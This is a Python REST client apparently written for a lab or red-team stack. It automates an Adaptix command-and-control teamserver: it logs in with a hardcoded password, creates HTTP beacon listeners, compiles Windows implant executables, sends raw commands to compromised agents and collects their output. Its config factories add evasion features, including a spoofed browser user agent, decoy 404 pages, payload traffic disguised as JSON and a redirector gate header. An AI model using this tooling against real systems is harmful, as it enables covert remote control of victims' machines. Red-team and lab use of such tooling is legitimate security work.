"""Adaptix C2 v1.2 REST client (headless).

The teamserver exposes an official REST API mounted at the profile's
`endpoint` (default `/endpoint`) on the SAME port as the operator protocol
(4321, HTTPS with a self-signed cert). No Qt client, no WebSocket and no OTP
are required for listener/agent operations.

Verified live 2026-10-03 against c2stack-adaptix-1.

Two things that are easy to get wrong and cost real debugging time:
  * Auth uses the TEAMserver password, not the per-operator one, whenever
    `profile.yaml` sets `only_password: true`. `operator1/pass1` fails with a
    bare 404; `operator1/pass` (any username) returns an access_token.
  * An auth or route failure returns the Adaptix 404 decoy page, NOT 401/403.
    A 404 therefore means "rejected", not "missing".
"""

from __future__ import annotations

import base64
import json
import ssl
import urllib.error
import urllib.request
from typing import Any

try:  # package-relative when imported as part of the app package
    from .c2backends import BackendError
except ImportError:  # flat module layout (app.py imports it directly)
    from c2backends import BackendError

ADAPTIX_HOST = "adaptix"
ADAPTIX_PORT = 4321
ADAPTIX_ENDPOINT = "/endpoint"
ADAPTIX_PASSWORD = "pass"  # teamserver password (only_password: true)
ADAPTIX_OPERATOR = "operator1"

_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36")


class AdaptixClient:
    def __init__(self, host: str = ADAPTIX_HOST, port: int = ADAPTIX_PORT,
                 endpoint: str = ADAPTIX_ENDPOINT) -> None:
        self.base = f"https://{host}:{port}{endpoint}"
        self._token: str | None = None
        # The container generates its own self-signed cert in entrypoint.sh.
        self._ssl = ssl.create_default_context()
        self._ssl.check_hostname = False
        self._ssl.verify_mode = ssl.CERT_NONE

    def _request(self, method: str, path: str, payload: dict[str, Any] | None = None,
                 timeout: int = 60, raw: bool = False) -> Any:
        url = f"{self.base}{path}"
        headers = {"Content-Type": "application/json"}
        if self._token:
            headers["Authorization"] = f"Bearer {self._token}"
        data = json.dumps(payload).encode() if payload is not None else None
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=timeout,
                                        context=self._ssl) as resp:
                body = resp.read()
        except urllib.error.HTTPError as exc:
            body = exc.read()
        except Exception as exc:
            raise BackendError(f"adaptix {method} {path}: {exc}") from exc
        if raw:
            return body
        text = body.decode("utf-8", "replace")
        if "<title>404 - Page Not Found</title>" in text or "AdaptixC2 404" in text:
            # Adaptix serves the 404 decoy for auth failures and unknown routes.
            raise BackendError(
                f"adaptix {method} {path} rejected (404 decoy). "
                "Usually: wrong password, missing Bearer token, or wrong path. "
                "With only_password: true use the TEAMserver password, not the "
                "operator password.")
        try:
            return json.loads(text)
        except ValueError as exc:
            raise BackendError(
                f"adaptix {method} {path}: non-JSON response ({exc}): {text[:120]}") from exc

    def login(self) -> str:
        out = self._request("POST", "/login", {
            "username": ADAPTIX_OPERATOR,
            "password": ADAPTIX_PASSWORD,
            "version": "v1.2",
        })
        token = out.get("access_token") if isinstance(out, dict) else None
        if not token:
            raise BackendError("adaptix login returned no access_token")
        self._token = token
        return token

    def _ensure(self) -> None:
        if not self._token:
            self.login()

    # ------------------------------------------------------------------ API
    def list_listeners(self) -> Any:
        self._ensure()
        return self._request("GET", "/listener/list", timeout=30)

    def create_listener(self, name: str, config: dict[str, Any]) -> Any:
        """Create + start a listener. `config` is the extender's TransportConfig
        as a JSON OBJECT (the Go field json tags); the REST layer marshals it."""
        self._ensure()
        return self._request("POST", "/listener/create", {
            "name": name,
            "type": "BeaconHTTP",
            "config": json.dumps(config),
        }, timeout=90)

    def list_agents(self) -> Any:
        self._ensure()
        return self._request("GET", "/agent/list", timeout=30)

    def generate_agent(self, agent: str, listener_name: str,
                       config: dict[str, Any], timeout: int = 300) -> bytes:
        """Build an agent server-side and return the raw bytes.

        The teamserver compiles with x86_64-w64-mingw32-g++ inside the
        container; this is the documented headless path (TsAgentBuildSyncOnce
        with an empty BuilderId runs the compile synchronously without a
        WebSocket build channel).
        """
        self._ensure()
        out = self._request("POST", "/agent/generate", {
            "agent": agent,
            "listener_name": [listener_name],
            "config": json.dumps(config),
        }, timeout=timeout)
        message = out.get("message") if isinstance(out, dict) else None
        if not message or ":" not in message:
            raise BackendError(f"adaptix agent/generate bad response: {str(out)[:200]}")
        # "<base64 filename>:<base64 content>"
        name_b64, _, content_b64 = message.partition(":")
        try:
            filename = base64.b64decode(name_b64).decode("utf-8", "replace")
            payload = base64.b64decode(content_b64)
        except Exception as exc:
            raise BackendError(f"adaptix agent/generate base64: {exc}") from exc
        setattr(self, "last_filename", filename)
        return payload

    def agent_command_raw(self, agent_id: str, cmdline: str) -> Any:
        self._ensure()
        return self._request("POST", "/agent/command/raw",
                             {"id": agent_id, "cmdline": cmdline}, timeout=60)

    def completed_tasks(self, agent_id: str, limit: int = 50,
                        offset: int = 0) -> Any:
        """Completed tasks WITH OUTPUT, straight from the teamserver.

        This is how a headless client gets task results: `command/raw` only
        queues the AxScript command, and the console output normally goes to
        the operator WebSocket. TsTaskListCompleted returns the finished
        tasks (including their output) over plain REST instead.
        """
        self._ensure()
        return self._request(
            "GET", f"/agent/task/list?agent_id={agent_id}"
                   f"&limit={limit}&offset={offset}", timeout=30)


# ---------------------------------------------------------------- factories
def http_listener_config(callback_address: str, uri: str,
                         c2_header: str = "X-Request-ID",
                         c2_header_value: str = "cadre-c2",
                         port: int = 80,
                         encrypt_key: str = "00112233445566778899aabbccddeeff",
                         user_agent: str = _UA) -> dict[str, Any]:
    """TransportConfig for beacon_listener_http (extender 'BeaconHTTP').

    Required fields per the extender's validConfig(): host_bind, port_bind,
    callback_addresses, encrypt_key, http_method, uri, hb_header, user_agent.
    `request_headers` is where the C2Stack redirector gate header goes -
    without it the beacon gets the CloudEdge decoy instead of the listener.
    `host_header` is left empty on purpose: an empty list SKIPS the Host check,
    and the redirector's ProxyPreserveHost makes the incoming Host unreliable.
    """
    return {
        "host_bind": "0.0.0.0",
        "port_bind": port,
        "callback_addresses": [callback_address],
        "encrypt_key": encrypt_key,
        "ssl": False,
        "http_method": "POST",
        "uri": [uri],
        "hb_header": "X-Beacon-Id",
        "user_agent": [user_agent],
        "host_header": [],
        "request_headers": f"{c2_header}: {c2_header_value}",
        "server_headers": "Content-Type: application/json\nServer: nginx",
        "x-forwarded-for": False,
        "page-error": ("<!DOCTYPE html><html><head><title>404</title></head>"
                       "<body><h1>404 Not Found</h1></body></html>"),
        # PAYLOAD_DATA is mandatory - the offsets are compiled into the beacon.
        "page-payload": ('{"status":"ok","data":"<<<PAYLOAD_DATA>>>",'
                         '"metrics":"sync"}'),
    }


def beacon_config(sleep: str = "30s", jitter: int = 0, arch: str = "x64",
                  fmt: str = "Exe", user_agent: str = _UA) -> dict[str, Any]:
    """AgentConfig for beacon_agent.

    jitter MUST be 0 on this vendored snapshot: WaitMask.cpp mixes seconds and
    milliseconds (fixed upstream in PR #379, after our snapshot), so any
    non-zero jitter subtracts milliseconds instead of seconds.
    """
    return {
        "arch": arch,
        "format": fmt,
        "sleep": sleep,
        "jitter": jitter,
        "is_killdate": False,
        "kill_date": "",
        "kill_time": "",
        "is_workingtime": False,
        "start_time": "",
        "end_time": "",
        "svcname": "AgentService",
        "is_sideloading": False,
        "sideloading_content": "",
        "iat_hiding": False,
        "use_proxy": False,
        "proxy_type": "http",
        "proxy_host": "",
        "proxy_port": 3128,
        "proxy_username": "",
        "proxy_password": "",
        # A single callback address only: 2nd+ entries may never be tried on
        # this snapshot (ConnectorHTTP.cpp failover bug, fixed in PR #377).
        "rotation_mode": "sequential",
        "user_agent": user_agent,
        "dns_mode": "DNS (Direct UDP)",
        "dns_resolvers": "8.8.8.8,1.1.1.1",
        "doh_resolvers": "https://dns.google/dns-query",
    }